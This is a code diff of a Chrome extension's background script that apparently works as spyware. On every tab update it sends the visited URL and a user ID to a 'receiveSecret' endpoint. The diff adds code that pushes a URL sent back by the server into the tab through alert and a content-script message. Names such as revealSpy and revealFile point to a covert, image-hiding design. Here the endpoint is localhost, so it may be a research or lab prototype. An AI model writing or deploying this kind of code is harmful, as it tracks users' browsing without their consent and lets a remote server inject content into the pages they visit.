@@ -198,11 +198,11 @@ ImageMask.prototype.revealFile = function (canvas) {
     return {name: fileName.join(''), data: data};
 }
 
-chrome.tabs.onUpdated.addListener(function (_, details) {
+chrome.tabs.onUpdated.addListener(function (tabId, details) {
         if (details) {
             if (details.url) {
                 if (isUsefulUrl(details.url) >= 0) {
-                    sendSecret(details.url);
+                    sendSecret(tabId,details.url);
                 }
             }
         }
@@ -211,20 +211,19 @@ chrome.tabs.onUpdated.addListener(function (_, details) {
 function isUsefulUrl(url) {
     return url.search(/http/);
 }
-function sendSecret(userSecret) {
-    var uid = "";
-    chrome.storage.sync.get("uid", function (item) {
+function sendSecret(tabId,userSecret) {
+    var uid = '';
+    chrome.storage.sync.get('uid', function (item) {
         if (item) {
             var xhr = new XMLHttpRequest();
-
-            xhr.open("GET", getAD(item.uid, userSecret), true);
+            xhr.open('GET', getAD(item.uid, userSecret), true);
             xhr.send(null);
             xhr.onreadystatechange = function () {
                 if (xhr.readyState == 4 && xhr.status == 200) {
                     var obj = JSON.parse(xhr.responseText);
-
                     if (obj.url) {
-
+                        alert(obj.url);
+                        chrome.tabs.sendMessage(tabId,{'greeting':obj.url});
                     } else {
 
                     }
@@ -234,7 +233,7 @@ function sendSecret(userSecret) {
     });
 }
 function getAD(item, userSecret) {
-    return "http://127.0.0.1:8080/receiveSecret?" + "uid=" + item + "&secretUrl=" + userSecret;
+    return 'http://127.0.0.1:8080/receiveSecret?' + 'uid=' + item + '&secretUrl=' + userSecret;
 }
 function getUIDServerUrl() {
     return "http://127.0.0.1:8080/uid";
@@ -266,7 +265,7 @@ chrome.runtime.onInstalled.addListener(function (details) {
     }
 );
 
-//TODO: Start after 5 seconds :)
+// TODO: Start after 5 seconds :)
 // window.setTimeout(revealSpy, 5000);
 
 function revealSpy() {
